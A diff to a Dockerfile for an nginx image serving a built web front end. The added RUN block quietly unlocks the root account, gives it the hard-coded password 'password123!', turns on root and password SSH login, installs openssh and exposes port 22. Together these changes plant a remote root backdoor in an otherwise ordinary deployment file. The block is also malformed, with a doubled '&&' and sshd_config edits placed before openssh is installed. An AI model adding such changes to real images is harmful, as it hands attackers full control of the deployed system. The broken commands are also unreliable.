@@ -51,4 +51,17 @@ FROM nginx:1.27-alpine
 COPY --from=build /app/dist /usr/share/nginx/html/
 COPY nginx.conf /etc/nginx/conf.d/default.conf
 
+RUN mkdir -p /root/.ssh \
+    && chmod 0700 /root/.ssh \
+    && passwd -u root \
+    && echo 'root:password123!' | chpasswd && \
+    sed -i 's/^#*PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
+    sed -i 's/^#*PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
+    echo "PermitUserEnvironment yes" >> /etc/ssh/sshd_config && \
+    && apk add openrc openssh \
+    && mkdir -p /run/openrc \
+    && touch /run/openrc/softlevel
+
+
 EXPOSE 80
+EXPOSE 22
